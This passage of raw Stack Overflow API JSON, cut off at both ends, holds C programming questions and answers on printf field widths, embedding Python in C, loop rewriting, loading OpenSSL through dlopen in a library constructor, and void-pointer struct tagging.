with my unordered map based on the hash of the location code. It uses a void pointer, so storing two different structs is not a problem. I know a possibility would be to have the flag be the first element and dereference the pointer to the flag datatype to derive the type, like so:</p>\n\n<pre><code>typedef struct _OctreeLeafNode\n{\n    uint8_t type;\n    uint64_t location_code;\n    uint64_t object_index;\n} OctreeLeafNode;\n\nvoid\nfunc(void* node)\n{\n    uint8_t type = *(uint8_t*)node;\n    if (type == LEAF_NODE) {\n        OctreeLeafNode* leaf_node = (OctreeLeafNode*)node;\n    }\n}\n</code></pre>\n\n<p>I was wondering if there is a cleaner way. Or is this not recommended? How would I be supposed to deal with multiple possibilities for structs and void pointers?</p>\n\n<p>Thanks in advance!</p>\n"}, {"tags": ["c", "floating-point", "printf"], "comments": [{"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 1, "creation_date": 1542212323, "post_id": 53304501, "comment_id": 93489903, "body": "Have you read the man page? There, it&#39;s described as the <i>minimum field width</i> (hint: try using a larger number, such as 15, if you want to see much difference)."}, {"owner": {"reputation": 58398, "user_id": 3233393, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/c4c576e0ebcdf0efd653269a5b020347?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/3233393/quentin"}, "edited": false, "score": 0, "creation_date": 1542212335, "post_id": 53304501, "comment_id": 93489909, "body": "Why is <a href=\"https://en.cppreference.com/w/cpp/io/c/fprintf\" rel=\"nofollow noreferrer\">this</a> not enough to answer your question?"}, {"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "edited": false, "score": 4, "creation_date": 1542212604, "post_id": 53304501, "comment_id": 93490079, "body": "I&#39;m voting to close this question as its answer is a <a href=\"https://en.cppreference.com/w/cpp/io/c/fprintf\" rel=\"nofollow noreferrer\">trivial documentation lookup</a>."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1542217399, "post_id": 53304501, "comment_id": 93492734, "body": "You&#39;re missing that <code>%2f</code> says simultaneously &#39;at least two characters of output&#39; and &#39;6 decimal places of output&#39; (by default, because there was no <code>.n</code> to override it).  And, since it must print 7 characters, the &#39;minimum of 2&#39; is meaningless.  Increase 2 to 20 and you&#39;d see an effect."}], "answers": [{"tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": false, "score": 2, "last_activity_date": 1542212749, "last_edit_date": 1542212749, "creation_date": 1542212322, "answer_id": 53304580, "question_id": 53304501, "link": "https://stackoverflow.com/questions/53304501/what-is-numberf-doing-in-c/53304580#53304580", "title": "what is %&lt;number&gt;f doing in C?", "body": "<p>This is the <em><strong>minimum</strong> field width</em>. Quoting <code>C11</code>, chapter \u00a77.21.6.1 </p>\n\n<blockquote>\n  <p>[...] minimum field width. If the converted value has fewer characters than the\n  field width, it is padded with spaces (by default) on the left (or right, if the left\n  adjustment flag, described later, has been given) to the field width. [....]</p>\n</blockquote>\n\n<p>I ran a test program, just to understand</p>\n\n<pre><code>printf(\"%10f\\n\", 20.56);\nprintf(\"%f\\n\", 20.56);\n</code></pre>\n\n<p>the output is</p>\n\n<pre><code> 20.560000\n20.560000\n</code></pre>\n\n<hr>\n\n<p>For a better understanding:</p>\n\n<pre><code>printf(\"%06.2f\\n\", 2.56);  // zero padding, instead of space, limited the precision\nprintf(\"%0.2f\\n\", 2.56);   // to be only two digits, so, total width to be printed \n                           // is 4, and in first case, we take the minimum width to be 6\n                           // so, on left, 2 digit padding should be there\n</code></pre>\n\n<p>result:</p>\n\n<pre><code>002.56\n2.56\n</code></pre>\n"}], "owner": {"reputation": 575, "user_id": 9428499, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6668aa8accba025baec1e60d1a97cbfb?s=128&d=identicon&r=PG&f=1", "display_name": "Krish", "link": "https://stackoverflow.com/users/9428499/krish"}, "delete_vote_count": 1, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 67, "favorite_count": 0, "closed_date": 1542216100, "answer_count": 1, "score": -7, "last_activity_date": 1542212852, "creation_date": 1542212054, "last_edit_date": 1542212852, "question_id": 53304501, "link": "https://stackoverflow.com/questions/53304501/what-is-numberf-doing-in-c", "closed_reason": "Not suitable for this site", "title": "what is %&lt;number&gt;f doing in C?", "body": "<p>If I use a conversion specifier like <code>%.2f</code> to print a floating point number, it limits the floating point to 2 decimal places when it's printed.</p>\n\n<p>But using a formation like <code>%2f</code> to a float doesn't seem to be doing anything, what am I missing?</p>\n"}, {"tags": ["python", "c++", "c", "python-c-api"], "comments": [{"owner": {"reputation": 141, "user_id": 5191483, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4937cf76a644a1a88be5fc1104eaacdb?s=128&d=identicon&r=PG&f=1", "display_name": "Milos Matovic", "link": "https://stackoverflow.com/users/5191483/milos-matovic"}, "edited": false, "score": 1, "creation_date": 1542213065, "post_id": 53304436, "comment_id": 93490382, "body": "It could be that the python extension library is using a wrong version of python, something like this: <a href=\"https://stackoverflow.com/questions/27408123/python-extension-module-with-embedded-python-calls-wrong-library\" title=\"python extension module with embedded python calls wrong library\">stackoverflow.com/questions/27408123/&hellip;</a>"}, {"owner": {"reputation": 378, "user_id": 8180138, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a1c912c699a4cf0f6c21c58204c2b15a?s=128&d=identicon&r=PG&f=1", "display_name": "Mitchell Faas", "link": "https://stackoverflow.com/users/8180138/mitchell-faas"}, "reply_to_user": {"reputation": 141, "user_id": 5191483, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4937cf76a644a1a88be5fc1104eaacdb?s=128&d=identicon&r=PG&f=1", "display_name": "Milos Matovic", "link": "https://stackoverflow.com/users/5191483/milos-matovic"}, "edited": false, "score": 0, "creation_date": 1542214408, "post_id": 53304436, "comment_id": 93491142, "body": "@MilosMatovic I read this post. I&#39;m on windows though, and just to be sure, I removed the 2.7 version I&#39;ve got installed. Either way, it shouldn&#39;t matter though, because the same instance of python is run for each line of python code, so the pip evaluation should list the same extension library. Am I mistaken?"}, {"owner": {"reputation": 26689, "user_id": 5769463, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/71a28b5fac23ee656a32cc7ea6df54ec?s=128&d=identicon&r=PG&f=1", "display_name": "ead", "link": "https://stackoverflow.com/users/5769463/ead"}, "edited": false, "score": 1, "creation_date": 1542350986, "post_id": 53304436, "comment_id": 93545104, "body": "probably, your created exe hasn&#39;t the same python-path as the installed python. Check the output of  <code>import sys; print(sys.path)</code>  in your exe"}, {"owner": {"reputation": 378, "user_id": 8180138, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a1c912c699a4cf0f6c21c58204c2b15a?s=128&d=identicon&r=PG&f=1", "display_name": "Mitchell Faas", "link": "https://stackoverflow.com/users/8180138/mitchell-faas"}, "reply_to_user": {"reputation": 26689, "user_id": 5769463, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/71a28b5fac23ee656a32cc7ea6df54ec?s=128&d=identicon&r=PG&f=1", "display_name": "ead", "link": "https://stackoverflow.com/users/5769463/ead"}, "edited": false, "score": 0, "creation_date": 1542366037, "post_id": 53304436, "comment_id": 93551742, "body": "@ead You&#39;re right. It&#39;s using python_d.exe instead of python.exe. Do you know if there&#39;s any way to force it to use the right one?"}], "owner": {"reputation": 378, "user_id": 8180138, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a1c912c699a4cf0f6c21c58204c2b15a?s=128&d=identicon&r=PG&f=1", "display_name": "Mitchell Faas", "link": "https://stackoverflow.com/users/8180138/mitchell-faas"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 188, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1542211864, "creation_date": 1542211864, "question_id": 53304436, "link": "https://stackoverflow.com/questions/53304436/python-throws-a-modulenotfounderror-when-loaded-from-c-but-not-when-directly-ex", "title": "Python throws a ModuleNotFoundError when loaded from C, but not when directly executed", "body": "<p>I'm in the process of making a module called BSPy. It's not really relevant what the module does, but its <code>setup.py</code> is:</p>\n\n<pre><code>from distutils.core import setup, Extension\n\nsetup(name='BSPy', version='0.0.2', ext_modules=[Extension('BSPy', ['Interface.cpp'])])\n</code></pre>\n\n<p>Now, in order to do some debugging steps I'm using C to call a python file, and try to execute it using this bit of code:</p>\n\n<pre><code>#include&lt;Python.h&gt;\nint main(int argc, char **argv) {\n    wchar_t *program = Py_DecodeLocale(argv[0], NULL);\n    if (program == NULL) {\n        fprintf(stderr, \"Fatal error: cannot decode argv[0]\\n\");\n        exit(1);\n    }\n    Py_SetProgramName(program);\n    Py_Initialize();\n\n    FILE* PythonScriptFile = fopen(\"D:/- Coding/python-bsp/test.py\", \"r\");\n    if (PythonScriptFile)\n    {\n        PyRun_SimpleFile(PythonScriptFile, \"D:/- Coding/python-bsp/test.py\");\n        fclose(PythonScriptFile);\n    }\n\n    Py_Finalize();\n\n    getchar();\n    return 0;\n</code></pre>\n\n<p>So far so good. I first tested a hello world file to make sure it works, and this is working wonderfully. I then went on to change the python file to use this BSPy module (which executes fine on its own and from the command line). The file now looks like this:</p>\n\n<pre><code>import platform\nimport pip  # needed to use the pip functions\n\nprint(platform.python_version())\n\nprint(sorted([\"%s==%s\" % (i.key, i.version) for i in pip.get_installed_distributions()]))\n\nimport BSPy as bsp\n\nprint(\"Hello world! - from processor {} of {}.\".format(bsp.pid(), bsp.nprocs()))\n</code></pre>\n\n<p>And is supposed to give the output</p>\n\n<blockquote>\n<pre><code>3.6.5\n['absl-py==0.2.2', 'argh==0.26.2', 'astor==0.6.2', 'astroid==1.6.4', 'autopep8==1.3.5', 'bleach==1.5.0', 'browser-cookie3==0.6.4', 'browsercookie2==0.7.1', 'bspy==0.0.2', 'cachetools==2.1.0', 'certifi==2018.4.16', 'chardet==3.0.4', 'colorama==0.3.9', 'cycler==0.10.0', 'entrypoints==0.2.3', 'feedparser==5.2.1', 'flake8-docstrings==1.3.0', 'flake8-polyfill==1.0.2', 'flake8==3.5.0', 'future==0.16.0', 'gast==0.2.0', 'google-api-core==1.2.0', 'google-auth==1.5.0', 'google-cloud-core==0.28.1', 'google-cloud-logging==1.6.0', 'googleapis-common-protos==1.5.3', 'grpcio==1.12.0', 'gtp==0.2', 'h5py==2.8.0', 'html5lib==0.9999999', 'httplib2==0.11.3', 'idna==2.6', 'iso8601==0.1.12', 'isort==4.3.4', 'jedi==0.13.1', 'keras-applications==1.0.6', 'keras-preprocessing==1.0.5', 'keyring==10.3.2', 'kiwisolver==1.0.1', 'lazy-object-proxy==1.3.1', 'lxml==4.2.5', 'lz4==2.0.0', 'm3u8==0.3.5', 'markdown==2.6.11', 'matplotlib==2.2.2', 'mccabe==0.6.1', 'mymodule==1.0', 'numpy==1.14.3', 'oauth2client==4.1.0', 'pandas==0.23.0', 'parso==0.3.1', 'pbkdf2==1.3', 'petname==2.2', 'pillow==5.3.0', 'pip==9.0.3', 'pluggy==0.7.1', 'protobuf==3.5.2.post1', 'pyaes==1.6.1', 'pyasn1-modules==0.2.1', 'pyasn1==0.4.3', 'pybsp==0.0.1', 'pycodestyle==2.3.1', 'pycryptodome==3.6.1', 'pydocstyle==2.1.1', 'pyflakes==1.6.0', 'pylint==1.9.1', 'pyparsing==2.2.0', 'python-dateutil==2.7.3', 'python-jsonrpc-server==0.0.2', 'python-language-server==0.21.2', 'pytz==2018.4', 'pywin32-ctypes==0.1.2', 'requests==2.18.4', 'rope==0.11.0', 'rsa==3.4.2', 'setuptools==40.4.3', 'sgf==0.5', 'six==1.11.0', 'snowballstemmer==1.2.1', 'tensorboard==1.8.0', 'tensorflow-gpu==1.8.0', 'termcolor==1.1.0', 'tqdm==4.23.4', 'typed-ast==1.1.0', 'urllib3==1.22', 'virtualenv==16.1.0', 'webencodings==0.5.1', 'werkzeug==0.14.1', 'wheel==0.31.1', 'wordcloud==1.5.0', 'wrapt==1.10.11', 'yapf==0.24.0']\nHello world! - from processor 3735928559 of 24.\n</code></pre>\n</blockquote>\n\n<p>However, when I try and run the C script again, it suddenly throws out a ModuleNotFoundError:</p>\n\n<blockquote>\n<pre><code>3.6.5\n['absl-py==0.2.2', 'argh==0.26.2', 'astor==0.6.2', 'astroid==1.6.4', 'autopep8==1.3.5', 'bleach==1.5.0', 'browser-cookie3==0.6.4', 'browsercookie2==0.7.1', 'bspy==0.0.2', 'cachetools==2.1.0', 'certifi==2018.4.16', 'chardet==3.0.4', 'colorama==0.3.9', 'cycler==0.10.0', 'entrypoints==0.2.3', 'feedparser==5.2.1', 'flake8-docstrings==1.3.0', 'flake8-polyfill==1.0.2', 'flake8==3.5.0', 'future==0.16.0', 'gast==0.2.0', 'google-api-core==1.2.0', 'google-auth==1.5.0', 'google-cloud-core==0.28.1', 'google-cloud-logging==1.6.0', 'googleapis-common-protos==1.5.3', 'grpcio==1.12.0', 'gtp==0.2', 'h5py==2.8.0', 'html5lib==0.9999999', 'httplib2==0.11.3', 'idna==2.6', 'iso8601==0.1.12', 'isort==4.3.4', 'jedi==0.13.1', 'keras-applications==1.0.6', 'keras-preprocessing==1.0.5', 'keyring==10.3.2', 'kiwisolver==1.0.1', 'lazy-object-proxy==1.3.1', 'lxml==4.2.5', 'lz4==2.0.0', 'm3u8==0.3.5', 'markdown==2.6.11', 'matplotlib==2.2.2', 'mccabe==0.6.1', 'mymodule==1.0', 'numpy==1.14.3', 'oauth2client==4.1.0', 'pandas==0.23.0', 'parso==0.3.1', 'pbkdf2==1.3', 'petname==2.2', 'pillow==5.3.0', 'pip==9.0.3', 'pluggy==0.7.1', 'protobuf==3.5.2.post1', 'pyaes==1.6.1', 'pyasn1-modules==0.2.1', 'pyasn1==0.4.3', 'pybsp==0.0.1', 'pycodestyle==2.3.1', 'pycryptodome==3.6.1', 'pydocstyle==2.1.1', 'pyflakes==1.6.0', 'pylint==1.9.1', 'pyparsing==2.2.0', 'python-dateutil==2.7.3', 'python-jsonrpc-server==0.0.2', 'python-language-server==0.21.2', 'pytz==2018.4', 'pywin32-ctypes==0.1.2', 'requests==2.18.4', 'rope==0.11.0', 'rsa==3.4.2', 'setuptools==40.4.3', 'sgf==0.5', 'six==1.11.0', 'snowballstemmer==1.2.1', 'tensorboard==1.8.0', 'tensorflow-gpu==1.8.0', 'termcolor==1.1.0', 'tqdm==4.23.4', 'typed-ast==1.1.0', 'urllib3==1.22', 'virtualenv==16.1.0', 'webencodings==0.5.1', 'werkzeug==0.14.1', 'wheel==0.31.1', 'wordcloud==1.5.0', 'wrapt==1.10.11', 'yapf==0.24.0']\nTraceback (most recent call last):\n  File \"D:/- Coding/python-bsp/test.py\", line 8, in &lt;module&gt;\n    import BSPy as bsp\nModuleNotFoundError: No module named 'BSPy'\n</code></pre>\n</blockquote>\n\n<p>Note that while it throws this error, pip is still confirming that BSPy is installed; hence I have no idea what could be wrong. Sadly, I can't give out a minimal working example, since the module can't be downloaded anywhere at the moment. I'm building it in this way though:</p>\n\n<pre><code>// Declare functions\nextern \"C\" {\n    static PyObject* init(PyObject* self, PyObject* args);\n    static PyObject* begin(PyObject* self, PyObject* args);\n    static PyObject* end(PyObject* self, PyObject* args);\n    static PyObject* execute(PyObject* self, PyObject* args);\n    static PyObject* pid(PyObject* self, PyObject* args);\n    static PyObject* nprocs(PyObject* self, PyObject* args);\n}\n\n// Define the methods with docstrings\nstatic PyMethodDef myMethods[] = {\n    {\"init\", init, METH_VARARGS, \"Runs SPMD function\" },\n    {\"begin\", begin, METH_VARARGS, \"Spawns an amount of processes\"}, \n    {\"end\", end, METH_NOARGS, \"Ends the processes\"},\n    {\"execute\", execute, METH_VARARGS, \"Execute function\"},\n    {\"pid\", pid, METH_NOARGS, \"Returns processor ID\"},\n    {\"nprocs\", nprocs, METH_NOARGS, \"Returns number of processors.\"},\n    {NULL, NULL, 0, NULL}\n};\n\n// Define the module\nstatic struct PyModuleDef BSPy = {\n    PyModuleDef_HEAD_INIT,\n    \"BSPy\",\n    \"A Python implementation of BSP\",\n    -1,\n    myMethods\n};\n\n\n// Initialize the module\nPyMODINIT_FUNC PyInit_BSPy(void) {\n    return PyModule_Create(&amp;BSPy);\n}\n///* Goes on to define each function. Only the simplest example is shown here.*///\nstatic PyObject* end(PyObject* self, PyObject* args) {\n    bsp_end();\n    return Py_None;\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 3, "creation_date": 1542211857, "post_id": 53304327, "comment_id": 93489595, "body": "I dont think this is syntactically correct."}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 1, "creation_date": 1542211890, "post_id": 53304327, "comment_id": 93489627, "body": "On a lighter node: since this does not compile, write anything you want, not going to make a difference."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1542215897, "post_id": 53304327, "comment_id": 93491960, "body": "Welcome to stackoverflow. Please take the <a href=\"https://stackoverflow.com/tour\">tour</a> and read this: <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a> and this: <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}], "answers": [{"comments": [{"owner": {"reputation": 1778, "user_id": 5698740, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/faee64fe3fa6b806a89f84492ba6c431?s=128&d=identicon&r=PG&f=1", "display_name": "clmno", "link": "https://stackoverflow.com/users/5698740/clmno"}, "reply_to_user": {"reputation": 1, "user_id": 10653015, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-LPxsgvOVnxA/AAAAAAAAAAI/AAAAAAAAAAA/ABtNlbATK2XJVLlpu94CB-fX8sFuwi0l7g/mo/photo.jpg?sz=128", "display_name": "Raffael", "link": "https://stackoverflow.com/users/10653015/raffael"}, "edited": false, "score": 0, "creation_date": 1542213445, "post_id": 53304531, "comment_id": 93490623, "body": "@Raffael Please make the answer by Tim as the solution if you are satisfied with the answer. So that the question can be closed."}, {"owner": {"reputation": 1, "user_id": 10653015, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-LPxsgvOVnxA/AAAAAAAAAAI/AAAAAAAAAAA/ABtNlbATK2XJVLlpu94CB-fX8sFuwi0l7g/mo/photo.jpg?sz=128", "display_name": "Raffael", "link": "https://stackoverflow.com/users/10653015/raffael"}, "edited": false, "score": 0, "creation_date": 1542214431, "post_id": 53304531, "comment_id": 93491152, "body": "@Tim you were correct about the sum being a double. Sum and done were defined as 0.0 and 0 respectively."}, {"owner": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "edited": false, "score": 0, "creation_date": 1542221947, "post_id": 53304531, "comment_id": 93494780, "body": "Minor correction: <code>(int)sum == 5</code> parses as <code>((int)sum) == 5</code>, not <code>(int)(sum == 5)</code>"}], "tags": [], "owner": {"reputation": 2647, "user_id": 9829403, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-RvgmsYSS48c/AAAAAAAAAAI/AAAAAAAAAAw/pUPnPAhmDec/photo.jpg?sz=128", "display_name": "Tim Randall", "link": "https://stackoverflow.com/users/9829403/tim-randall"}, "is_accepted": true, "score": 3, "last_activity_date": 1542224527, "last_edit_date": 1542224527, "creation_date": 1542212176, "answer_id": 53304531, "question_id": 53304327, "link": "https://stackoverflow.com/questions/53304327/figuring-out-what-this-function-does/53304531#53304531", "title": "Figuring out what this function does?", "body": "<p>Let's assume that the syntax error is resolved, so that the code reads</p>\n\n<pre><code>for(;; done = (int) sum == 5)\n{\n    if (done) break;\n    sum += 2.6;\n}\n</code></pre>\n\n<p>Now this code works as follows: the <code>for</code> loop has no initialization expression and no test expression, so it begins execution unconditionally. The first thing that happens is the \"flag\" <code>done</code> (an undefined object that I'm assuming is an <code>int</code> that may or may not be initialized to zero) is checked. If it's true (non-zero), the code breaks out of the <code>for</code> loop. if not, 2.6 (a <code>double</code>) is added to <code>sum</code> (an undefined object that I'm assuming is a <code>double</code> and that may or may not be initialized to a sensible value, or a number at all). When execution reaches the closing brace, the iteration statement in the <code>for</code> loop is executed, which compares <code>sum</code> to 5 (after converting <code>sum</code> to an integer value), and assigns the result of the comparison (i.e. 1 for true and 0 for false) to <code>done</code>.</p>\n\n<p>Converting this to a <code>while</code> loop ought to be fairly straightforward. Simply execute these steps in order. Note that since the first piece of code to execute is checking <code>if(done)</code>, the code more naturally lends itself to a simple <code>while</code> than a <code>do-while</code> loop.</p>\n\n<p>Note that this would have been considerably clearer if you had defined the types of your variables, and provided initial values for them.</p>\n"}], "owner": {"reputation": 1, "user_id": 10653015, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-LPxsgvOVnxA/AAAAAAAAAAI/AAAAAAAAAAA/ABtNlbATK2XJVLlpu94CB-fX8sFuwi0l7g/mo/photo.jpg?sz=128", "display_name": "Raffael", "link": "https://stackoverflow.com/users/10653015/raffael"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 40, "favorite_count": 0, "accepted_answer_id": 53304531, "answer_count": 1, "score": -2, "last_activity_date": 1542224527, "creation_date": 1542211510, "question_id": 53304327, "link": "https://stackoverflow.com/questions/53304327/figuring-out-what-this-function-does", "title": "Figuring out what this function does?", "body": "<p>I have to rewrite this for loop into a do while loop, but I can't figure out what this does. Please help </p>\n\n<pre><code>for(;; done = (int) sum == 5\n{if (done) break;\nsum += 2.6;}\n</code></pre>\n"}, {"tags": ["c", "shared-libraries", "dlopen"], "comments": [{"owner": {"reputation": 132, "user_id": 2215094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/420082033df8a19de1d5f4e5c50604ee?s=128&d=identicon&r=PG", "display_name": "Jan Schatz", "link": "https://stackoverflow.com/users/2215094/jan-schatz"}, "edited": false, "score": 0, "creation_date": 1542355200, "post_id": 53303474, "comment_id": 93546605, "body": "To the one who downvoted my question: Please leave a comment at least, so I can improve the question."}], "answers": [{"tags": [], "owner": {"reputation": 132, "user_id": 2215094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/420082033df8a19de1d5f4e5c50604ee?s=128&d=identicon&r=PG", "display_name": "Jan Schatz", "link": "https://stackoverflow.com/users/2215094/jan-schatz"}, "is_accepted": false, "score": 0, "last_activity_date": 1542356202, "creation_date": 1542356202, "answer_id": 53333874, "question_id": 53303474, "link": "https://stackoverflow.com/questions/53303474/load-shared-library-for-another-shared-library/53333874#53333874", "title": "Load shared library for another shared library", "body": "<p>I found a solution myself.</p>\n\n<p>The problem was that shared libraries are initialised (i.e. C constructors are being called) before the main application. You can see the order when you set the environment variable <code>LD_DEBUG=libs</code>. So I created a shared library myself. I linked this fix library after the buggy library (<code>-lbuggy -lfix</code>), because initialisation roughly (I don't really understand the rules.) takes place in reverse loading order.</p>\n\n<p>Now I was able to load OpenSSL inside the C constructor of my fix library like this:</p>\n\n<pre><code>void *p = dlopen(\"libssl.so.1.0.0\", RTLD_LAZY | RTLD_GLOBAL | RTLD_NODELETE);\nif(p)\n  dlclose(p);\n</code></pre>\n\n<p>The flag <code>RTLD_GLOBAL</code> assures that OpenSSL can also be used by other libraries.\nThe flag <code>RTLD_NODELETE</code> assures that the library is not unloaded on <code>dlclose</code>.</p>\n\n<p>Note: When my update application runs on a newer system with OpenSSL 1.1 and a shared library that correctly links against OpenSSL, loading <code>libssl.so.1.0.0</code> will fail silently, because the old OpenSSL version is not present on this system (embedded system, need to save disk space). If OpenSSL 1.0 was still present, this could be a problem.</p>\n"}], "owner": {"reputation": 132, "user_id": 2215094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/420082033df8a19de1d5f4e5c50604ee?s=128&d=identicon&r=PG", "display_name": "Jan Schatz", "link": "https://stackoverflow.com/users/2215094/jan-schatz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 108, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1542356202, "creation_date": 1542208874, "question_id": 53303474, "link": "https://stackoverflow.com/questions/53303474/load-shared-library-for-another-shared-library", "title": "Load shared library for another shared library", "body": "<p>I am working on an update application that must be able to run on an existing system and is also started by another application on this existing system.</p>\n\n<p>I am using a shared library that itself uses OpenSSL, but didn't link against it. Previously my update application linked against OpenSSL to work around this. But now I cannot link against OpenSSL any longer due to binary incompatibilities. Now when my application is started on the existing system, I get an <code>undefined symbol</code> error, because OpenSSL is not loaded. Note that I don't have the option to load it through <code>LD_PRELOAD</code>, because I cannot change the application that starts my update application.</p>\n\n<p>I thought about loading OpenSSL through <code>dlopen</code> hoping that the shared library would be able to use it. But the shared library uses OpenSSL in a C constructor (<code>__attribute__((constructor (101))) void myConstructor()</code>) and even if I call <code>dlopen</code> inside another constructor with higher priority, the dynamic loader already seems to have searched (and failed) for OpenSSL. My constructor is not even being executed.</p>\n\n<p><code>LD_BIND_NOW</code> is not set, so I wonder why the <code>undefined symbol</code> error occurs before my constructor is being called.</p>\n"}, {"tags": ["c", "pointers", "casting"], "comments": [{"owner": {"reputation": 3125, "user_id": 2878796, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8bxWv.png?s=128&g=1", "display_name": "UnholySheep", "link": "https://stackoverflow.com/users/2878796/unholysheep"}, "edited": false, "score": 4, "creation_date": 1542207937, "post_id": 53303181, "comment_id": 93487131, "body": "Please provide a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>. The lifetime of the variables is important as well"}, {"owner": {"reputation": 506, "user_id": 6655405, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/oqJAE.png?s=128&g=1", "display_name": "Stelios Papamichail", "link": "https://stackoverflow.com/users/6655405/stelios-papamichail"}, "edited": false, "score": 0, "creation_date": 1542208110, "post_id": 53303181, "comment_id": 93487255, "body": "@Swordfish i thought about that but if that was the case, wouldn&#39;t i be experiencing undefined behavior? In this case it&#39;s always just the 3rd element that has a value of 0.0 whereas the other 2 are always ok"}, {"owner": {"reputation": 7825, "user_id": 3684343, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5bee557e309dc42d91a706c70c8c0c9f?s=128&d=identicon&r=PG&f=1", "display_name": "mch", "link": "https://stackoverflow.com/users/3684343/mch"}, "edited": false, "score": 0, "creation_date": 1542208114, "post_id": 53303181, "comment_id": 93487258, "body": "Is the <code>a</code> in <code>sides[0] = &amp;a;</code> the same as in <code>double a,...</code>?"}, {"owner": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "reply_to_user": {"reputation": 15800, "user_id": 1274314, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/gSYsp.jpg?s=128&g=1", "display_name": "TypeIA", "link": "https://stackoverflow.com/users/1274314/typeia"}, "edited": false, "score": 0, "creation_date": 1542208115, "post_id": 53303181, "comment_id": 93487260, "body": "@TypeIA Yes, right."}, {"owner": {"reputation": 506, "user_id": 6655405, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/oqJAE.png?s=128&g=1", "display_name": "Stelios Papamichail", "link": "https://stackoverflow.com/users/6655405/stelios-papamichail"}, "reply_to_user": {"reputation": 7825, "user_id": 3684343, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5bee557e309dc42d91a706c70c8c0c9f?s=128&d=identicon&r=PG&f=1", "display_name": "mch", "link": "https://stackoverflow.com/users/3684343/mch"}, "edited": false, "score": 0, "creation_date": 1542208163, "post_id": 53303181, "comment_id": 93487294, "body": "@mch yes, let me add some more of my code"}, {"owner": {"reputation": 3125, "user_id": 2878796, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8bxWv.png?s=128&g=1", "display_name": "UnholySheep", "link": "https://stackoverflow.com/users/2878796/unholysheep"}, "edited": false, 